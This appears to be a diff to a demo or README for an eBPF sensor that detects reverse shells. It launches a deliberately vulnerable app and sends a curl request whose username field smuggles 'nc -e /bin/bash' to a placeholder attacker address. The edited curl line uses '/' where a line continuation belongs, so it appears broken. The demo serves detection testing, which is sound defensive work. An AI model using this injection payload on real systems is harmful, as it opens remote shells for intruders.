@@ -34,7 +34,8 @@ docker run -d --rm\
   rce-vuln-app
 
 # Attack vunlnable server (input don't shielded)
-curl -X POST http://<rce_server_ip>:5000/ -d "username=; nc -e /bin/bash <attacker_ip> <attacker_port>;&password=test"
+curl -X POST http://<rce_server_ip>:5000/ -d /
+"username=; nc -e /bin/bash <attacker_ip> <attacker_port>;&password=test"
 
 # Watch the output of eBPF-sensor
 [ALERT] REVERSE_SHELL_DETECTED
